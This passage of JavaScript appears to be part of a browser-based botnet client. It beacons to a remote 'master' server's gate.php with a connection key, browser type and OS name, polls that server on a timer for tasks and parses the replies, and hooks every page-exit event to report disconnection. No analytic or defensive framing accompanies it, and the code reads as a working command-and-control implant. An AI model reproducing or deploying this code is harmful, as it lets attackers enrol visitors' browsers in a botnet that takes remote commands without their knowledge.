                    }
                }, 0);
            }
        }
    }
}

function pingHome() {
    var rand = Math.floor(Math.random() * 10000);

    xmlhttp.open("GET", master + "/gate.php?gettasks=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&rand=" + rand, true);
    xmlhttp.send(null);

    xmlhttp.onreadystatechange = function() {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            Parse(xmlhttp.responseText, xmlhttp);
        }
    };
}

var xmlhttp;
if (window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
} else {
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}


var rand = Math.floor(Math.random() * 10000);
xmlhttp.open("GET", master + "/gate.php?connect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&rand=" + rand, true);
xmlhttp.send(null); //Send connect

connected = true;

pingHome(xmlhttp);
setInterval(function () { pingHome(xmlhttp); }, timeout);

//Disconnect hooks for ALL browsers
window.addEventListener("unload",function(e) {
    disconnect(xmlhttp);
},false);

window.addEventListener("beforeunload",function(e) {
    disconnect(xmlhttp);
},false);

window.addEventListener("popstate", function(e) {
    disconnect(xmlhttp);
},false);

window.addEventListener("pagehide",function(e) {
    disconnect(xmlhttp);
},false);
